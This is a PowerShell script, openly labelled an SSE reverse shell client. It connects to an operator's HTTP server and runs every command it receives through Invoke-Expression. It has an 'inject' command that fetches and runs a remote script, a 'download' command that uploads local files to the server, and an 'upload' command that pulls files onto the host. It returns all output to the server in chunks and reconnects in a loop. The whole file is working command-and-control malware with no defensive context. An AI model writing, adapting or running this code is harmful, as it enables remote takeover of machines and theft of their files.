<#
.SYNOPSIS
SSE Reverse Shell Client.

.DESCRIPTION
Connects to an SSE endpoint via HTTP, listens for incoming commands using Server-Sent Events,
executes them locally, and posts results back to a server.

.PARAMETER Uri
The base URI of the SSE server (e.g., http://<SERVER-IP>:8085).

.NOTES
Author: 4rt3f4kt
#>

function SSEClient {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Uri
    )

    $sseUri  = "$Uri/rsse"
    $postUri = "$Uri/post"
    $uploadUri = "$Uri/upload"
    $downloadUri = "$Uri/download"

    [System.Net.ServicePointManager]::Expect100Continue = $false

    while ($true) {
        try {
            $request = [System.Net.WebRequest]::Create($sseUri)
            $request.Method = "GET"
            $request.Accept = "text/event-stream"
            $response = $request.GetResponse()
            $stream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream)

            Write-Host "Connected to SSE stream at $sseUri."

            while (-not $reader.EndOfStream) {
                try {
                    $line = $reader.ReadLine()
                    if ($line -and $line.StartsWith("data:")) {
                        $msg = $line.Substring(5).Trim()

                        if ($msg -eq "keep-alive") {
                            continue
                        }

                        if (-not [string]::IsNullOrWhiteSpace($msg) -and $msg -ne "0") {
                            Write-Host "SSE message received: $msg"

                            # Variable pour stocker la sortie
                            $output = ""

                            # Gérer les commandes spécifiques
                            if ($msg.StartsWith("download ")) {
                                $filename = $msg.Substring(9).Trim()
                                if (Test-Path $filename) {
                                    try {
                                        $fileContent = [System.IO.File]::ReadAllBytes($filename)
                                        $boundary = [System.Guid]::NewGuid().ToString()
                                        $body = "--$boundary`r`n"
                                        $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"`r`n"
                                        $body += "Content-Type: application/octet-stream`r`n`r`n"
                                        $body += [System.Text.Encoding]::UTF8.GetString($fileContent)
                                        $body += "`r`n--$boundary--`r`n"
                            
                                        $uploadResponse = Invoke-WebRequest -Uri $uploadUri -Method POST -Body $body -Headers @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
                                        $output = "File '$filename' uploaded successfully to the server."
                                    }
                                    catch {
                                        $output = "Error uploading file '$filename': $_"
                                    }
                                }
                                else {
                                    $output = "File '$filename' does not exist on the client."
                                }
                            }
                            elseif ($msg.StartsWith("upload ")) {
                                $filename = $msg.Substring(7).Trim()
                                try {
                                    $fileResponse = Invoke-WebRequest -Uri "$downloadUri/$filename" -Method GET -OutFile $filename
                                    $output = "File '$filename' downloaded successfully from the server."
                                }
                                catch {
                                    $output = "Error downloading file '$filename': $_"
                                }
                            }
                            elseif ($msg.StartsWith("inject ")) {
                                $url = $msg.Substring(7).Trim()
                                try {
                                    $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
                            
                                    $output = Invoke-Expression $scriptContent
                                }
                                catch {
                                    $output = "Error injecting script from URL '$url': $_"
                                }
                            }
                            else {
                                # Gérer les commandes générales
                                try {
                                    $output = Invoke-Expression $msg | Out-String
                                }
                                catch {
                                    $output = "Error executing command '$msg': $_"
                                }
                            }

                            # Envoyer la réponse complète au serveur en morceaux
                            $chunkSize = 4000  # Taille des morceaux (en caractères)
                            for ($i = 0; $i -lt $output.Length; $i += $chunkSize) {
                                $chunk = $output.Substring($i, [Math]::Min($chunkSize, $output.Length - $i))
                                $postBody = "databack: $chunk"
                                try {
                                    $postResponse = Invoke-WebRequest -Uri $postUri -Method POST -Body $postBody -ContentType "text/plain; charset=utf-8"
                                    Write-Host "Sent databack chunk, server response:"
                                    Write-Host $postResponse.Content
                                }
                                catch {
                                    Write-Warning "Error posting databack chunk to server: $_"
                                }
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "Error processing SSE message: $_"
                    break
                }
            }
        }
        catch {
            Write-Warning "Error connecting to SSE server: $_"
        }
        finally {
            if ($reader) { $reader.Close() }
            if ($stream) { $stream.Close() }
            if ($response) { $response.Close() }
        }

        Write-Host "Reconnecting SSE after failure..."
        Start-Sleep -Seconds 5
    }
}